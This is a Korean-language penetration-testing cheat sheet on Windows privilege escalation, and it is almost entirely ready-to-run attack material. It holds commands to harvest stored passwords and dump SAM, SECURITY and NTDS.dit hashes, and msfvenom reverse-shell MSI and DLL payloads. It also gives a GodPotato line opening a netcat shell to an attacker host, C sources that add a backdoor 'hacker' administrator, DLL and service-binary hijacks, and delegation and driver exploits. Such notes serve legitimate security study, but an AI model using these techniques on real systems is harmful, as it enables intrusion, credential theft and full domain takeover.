---
sidebar_position: 2
---

# Windows Privilege Escalation

Windows 시스템에서의 권한 상승 기법입니다.

## 기본 열거

```cmd
# 사용자 정보
whoami
whoami /all
whoami /user
whoami /priv
whoami /groups

# 시스템 정보
systeminfo
hostname

# 계정 정보
net accounts
net user
net user /domain
net user <USERNAME>
net localgroup
net localgroup administrators

# PowerShell
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember administrators
Get-LocalGroupMember "Remote Desktop Users"

# 프로세스
Get-Process
tasklist
tasklist /SVC
tree /f C:\Users\

# 서비스
sc query
sc qc <SERVICE>
Get-Service

# 방화벽
netsh firewall show state
netsh advfirewall firewall show rule name=all
netsh advfirewall show allprofiles

# 예약된 작업
schtasks /query /fo LIST /v
Get-ScheduledTask

# 설치된 업데이트
wmic qfe get Caption,Description,HotFixID,InstalledOn

# 드라이버
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path

# 네트워크
ipconfig /all
route print
arp -a
netstat -ano
```

## SID (Security Identifier)

### SID 구조

**형식:** S-R-X-Y
- **S**: SID를 나타냄
- **R**: Revision (항상 1)
- **X**: Identifier Authority (대부분 5)
- **Y**: Sub Authority

### 주요 SID

| SID | 설명 |
|-----|------|
| S-1-0-0 | Nobody |
| S-1-1-0 | Everybody |
| S-1-5-11 | Authenticated Users |
| S-1-5-18 | Local System |
| S-1-5-19 | Local Service |
| S-1-5-20 | Network Service |
| S-1-5-domainidentifier-500 | Administrator |
| S-1-5-domainidentifier-512 | Domain Admins |
| S-1-5-domainidentifier-513 | Domain Users |

## accesschk

> https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk

```cmd
# 파일 권한 확인
.\accesschk.exe /accepteula -quvw "C:\PATH\TO\FILE\<FILE>.exe"

# 서비스 권한 확인
.\accesschk.exe /accepteula -uwcqv <USERNAME> <SERVICE>
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# 경로 권한 확인 (Unquoted Service Path)
.\accesschk.exe /accepteula -uwdq C:\
.\accesschk.exe /accepteula -uwdq "C:\Program Files\"
.\accesschk.exe /accepteula -uwdq "C:\Program Files\<UNQUOTED_SERVICE_PATH>\"

# 레지스트리 권한 확인
.\accesschk.exe /accepteula -uvwqk <REGISTRY_KEY>
```

## 숨김 파일/폴더 표시

```cmd
# cmd
dir /a           # 모든 숨김 파일/폴더
dir /a:d         # 숨김 디렉토리만
dir /a:h         # 숨김 파일만

# 명시적 cmd
cmd /c dir /A
cmd /c dir /A:D
cmd /c dir /A:H

# PowerShell
powershell ls -force
Get-ChildItem -Hidden
Get-ChildItem -Force
```

## 설치된 프로그램 확인

```cmd
# 레지스트리 조회
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# WMIC
wmic product get name,version
```

## 사용자 관리

```cmd
# 사용자 추가
net user <USERNAME> <PASSWORD> /add
net user <USERNAME> <PASSWORD> /add /domain

# 그룹 추가
net localgroup administrators <USERNAME> /add
net localgroup "Remote Desktop Users" <USERNAME> /add
net group "Exchange Windows Permissions" /add <USERNAME>
net localgroup "Remote Management Users" /add <USERNAME>

# 사용자 삭제
net user <USERNAME> /delete
```

## 자격증명 수집

### Quick Wins

```cmd
# 저장된 자격증명
cmdkey /list
rundll32 keymgr.dll, KRShowKeyMgr

# Winlogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# PuTTY
reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s

# 연결 문자열
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### 파일에서 비밀번호 검색

```cmd
# 기본 검색
findstr /si password *.xml *.ini *.txt
findstr /si password *.config

# 디렉토리 검색
dir /s *pass* == *.config
dir /s *pass* == *cred* == *vnc* == *.config*

# PowerShell 검색
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\<USERNAME>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

# 특정 확장자
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.config,*.xml,*.vbs,*.ps1 -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
```

### PowerShell 히스토리

```cmd
# 히스토리 확인
Get-History

# 히스토리 파일 경로
(Get-PSReadlineOption).HistorySavePath

# 히스토리 파일 읽기
type C:\Users\%username%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

type C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### 저장된 Windows 자격증명

```cmd
# 저장된 자격증명 목록
cmdkey /list

# 저장된 자격증명으로 실행
runas /savecred /user:<DOMAIN>\<USERNAME> cmd.exe
runas /savecred /user:administrator cmd.exe
```

### Winlogon 자격증명

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# DefaultUserName, DefaultPassword 확인
```

### LAPS (Local Administrator Password Solution)

```cmd
# LAPS 비밀번호 확인
Get-ADComputer <RHOST> -property 'ms-mcs-admpwd'

# LAPS 설치 확인
Get-ChildItem 'C:\Program Files\LAPS\CSE\Admpwd.dll'

# LAPS 레지스트리
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
```

### 레지스트리에서 비밀번호 검색

```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

reg query HKLM /f pwd /t REG_SZ /s
reg query HKCU /f pwd /t REG_SZ /s
```

### 자격증명 덤프

```cmd
# SAM, SYSTEM, SECURITY 덤프
reg save hklm\system system
reg save hklm\sam sam
reg save hklm\security security

# 또는
reg.exe save hklm\sam c:\temp\sam.save
reg.exe save hklm\security c:\temp\security.save
reg.exe save hklm\system c:\temp\system.save

# 복원 (로컬에서)
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

### KeePass 데이터베이스 찾기

```cmd
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

dir /s /b C:\*.kdbx
```

### IIS (Internet Information Service)

```cmd
# IIS 설정
C:\Windows\System32\inetsrv\appcmd.exe list apppool /@:*

# web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

# applicationHost.config
type C:\Windows\System32\inetsrv\config\applicationHost.config
```

### PuTTY

```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /s
```

### Unattended Windows Installations

```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

```cmd
# 검색
dir /s C:\Unattend.xml
dir /s C:\sysprep.inf
dir /s C:\sysprep.xml

# 내용 확인
type C:\Windows\Panther\Unattend.xml
```

## WinRM 활성화

```cmd
winrm quickconfig
Enable-PSRemoting -Force

# 원격에서 활성화
.\PsExec64.exe \\<RHOST> -u <DOMAIN>\<USERNAME> -p <PASSWORD> -h -d powershell.exe "enable-psremoting -force"
```

## RDP 활성화

```cmd
# RDP 활성화
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# 방화벽 규칙
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# PowerShell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

## 권한 및 특권

### AlwaysInstallElevated

```cmd
# 확인
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 둘 다 1이면 악용 가능
```

MSI 파일 생성:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o shell.msi
```

실행:
```cmd
msiexec /quiet /qn /i shell.msi
```

### SeBackup / SeRestore 권한

#### SAM과 SYSTEM 해시 백업

```cmd
# SAM, SYSTEM 덤프
reg save hklm\sam C:\Temp\sam
reg save hklm\system C:\Temp\system

# 다운로드 후 로컬에서:
impacket-secretsdump -sam sam -system system LOCAL
```

#### diskshadow를 이용한 NTDS.dit 복사

**Script (script.txt):**
```
set context persistent nowriters
add volume c: alias temp
create
expose %temp% z:
```

실행:
```cmd
diskshadow /s script.txt

# NTDS.dit 복사
robocopy /b z:\windows\ntds . ntds.dit

# SYSTEM 레지스트리
reg save hklm\system system

# 종료
diskshadow
delete shadows volume %temp%
reset
exit
```

로컬에서 해시 추출:
```bash
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

#### Robocopy 대안

```cmd
robocopy /b z:\windows\ntds . ntds.dit
```

### SeEnableDelegationPrivilege

#### 예제 1

```powershell
# 취약한 사용자 확인
Get-ADUser -Filter * | Where-Object {$_.UserPrincipalName -ne $null}

# 권한 추가
Set-ADUser <USERNAME> -Add @{'msDS-AllowedToDelegateTo'=@('TIME/<DC>','TIME/<DC>.<DOMAIN>')}
```

#### 예제 2

```cmd
# 컴퓨터 계정 생성
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Password123' -dc-ip <DC_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'

# rbcd.py
python3 rbcd.py -dc-ip <DC_IP> -t <TARGET_COMPUTER> -f 'FAKE01$' -d <DOMAIN> -u <USERNAME> -p <PASSWORD>

# TGT 요청
impacket-getST -spn 'cifs/<TARGET_COMPUTER>.<DOMAIN>' -impersonate Administrator -dc-ip <DC_IP> '<DOMAIN>/FAKE01$:Password123'
```

### SeLoadDriverPrivilege

Capcom.sys 드라이버 로드 취약점

> https://github.com/TarlogicSecurity/EoPLoadDriver

```cmd
# 드라이버 로드
EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\PATH\TO\Capcom.sys

# ExploitCapcom.exe 실행
ExploitCapcom.exe
```

### SeManageVolumePrivilege

#### C:\ 드라이브 전체 권한 부여

```cmd
# C:\ 권한 확인
icacls C:\

# SeManageVolume 사용
# DLL 로드
```

#### Printconfig.dll 덮어쓰기

1. **악성 DLL 생성**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o evil.dll
```

2. **Printconfig.dll 교체**
```cmd
# 원본 백업
move C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll Printconfig.dll.bak

# 악성 DLL 복사
copy evil.dll C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll

# Print Spooler 재시작
net stop spooler
net start spooler
```

### SeTakeOwnershipPrivilege

```cmd
# 파일 소유권 가져오기
takeown /f C:\PATH\TO\FILE

# 권한 부여
icacls C:\PATH\TO\FILE /grant <USERNAME>:F

# 예제: SYSTEM 파일
takeown /f C:\Windows\System32\config\SAM
icacls C:\Windows\System32\config\SAM /grant <USERNAME>:F
```

### SeImpersonate / SeAssignPrimaryToken

#### JuicyPotato

> https://github.com/ohpe/juicy-potato

CLSID 찾기: http://ohpe.it/juicy-potato/CLSID/

```cmd
.\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p C:\Windows\system32\cmd.exe -a "/c whoami > C:\temp\output.txt" -t *
```

#### PrintSpoofer

> https://github.com/itm4n/PrintSpoofer

```cmd
.\PrintSpoofer64.exe -i -c powershell.exe
.\PrintSpoofer64.exe -i -c cmd
```

#### GodPotato

> https://github.com/BeichenDream/GodPotato

```cmd
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "nc -e cmd <LHOST> <LPORT>"
```

## DLL Hijacking

### DLL 검색 순서

1. The directory from which the application loaded
2. The system directory (C:\Windows\System32)
3. The 16-bit system directory (C:\Windows\System)
4. The Windows directory (C:\Windows)
5. The current directory
6. The directories in the PATH environment variable

### DLL 악용

```cmd
# 쓰기 가능한 경로 찾기
icacls "C:\Program Files\<APP>"

# 프로세스가 로드하는 DLL 확인
.\procmon.exe
```

### customdll.cpp

```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
            system("cmd.exe /c net user hacker Password123! /add");
            system("cmd.exe /c net localgroup administrators hacker /add");
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

### 컴파일

```bash
x86_64-w64-mingw32-gcc customdll.cpp --shared -o customdll.dll
```

### 실행

```cmd
# DLL을 경로에 복사
copy customdll.dll "C:\Program Files\<APP>\"

# 서비스 재시작
Restart-Service <SERVICE>

# 확인
Get-LocalGroupMember administrators
```

## Windows 서비스 악용

### 실행 중인 서비스 열거

```cmd
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

sc query
Get-Service
```

### 서비스 설정 확인

```cmd
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<SERVICE>'}

sc qc <SERVICE>
```

### 권한 테이블

| Mask | Permissions |
|------|-------------|
| F | Full access |
| M | Modify access |
| RX | Read and execute access |
| R | Read-only access |
| W | Write-only access |

### 권한 열거

```cmd
icacls "C:\PATH\TO\BINARY\<BINARY>"

.\accesschk.exe /accepteula -quvw "C:\PATH\TO\BINARY\<BINARY>.exe"
```

### 서비스 바이너리 교체

#### adduser.c

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user hacker Password123! /add");
  i = system ("net localgroup administrators hacker /add");
  
  return 0;
}
```

#### 컴파일

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
i686-w64-mingw32-gcc adduser.c -o adduser.exe  # 32bit
```

#### 실행

```cmd
# 서비스 중지 및 시작
net stop <SERVICE>
net start <SERVICE>

# 또는 재부팅
shutdown /r /t 0

# 확인
Get-LocalGroupMember administrators
net localgroup administrators
```

### Unquoted Service Path

```cmd
# 취약한 서비스 찾기
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

# PowerShell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.PathName -notmatch "`"" -and $_.PathName -notmatch "C:\\Windows"}

# 권한 확인
icacls "C:\Program Files\Unquoted Path Service\"

# 악성 바이너리 배치
copy evil.exe "C:\Program Files\Unquoted.exe"

# 서비스 재시작
net stop <SERVICE>
net start <SERVICE>
```

### PowerUp.ps1

> https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

```powershell
powershell -ep bypass
. .\PowerUp.ps1

# 취약한 서비스 찾기
Get-ModifiableServiceFile

# 악용
Install-ServiceBinary -Name '<SERVICE>'

# 또는
Write-ServiceBinary -Name '<SERVICE>' -Path 'C:\Temp\service.exe'
```

## 참고

- **PayloadsAllTheThings**: Windows Privilege Escalation
- **HackTricks**: Windows Local Privilege Escalation
- **LOLBAS**: Living Off The Land Binaries and Scripts
- **WinPEAS**: Windows 권한 상승 자동화 스크립트
- **PowerUp**: PowerShell 권한 상승 스크립트
- **PrivescCheck**: PowerShell 권한 상승 점검 스크립트
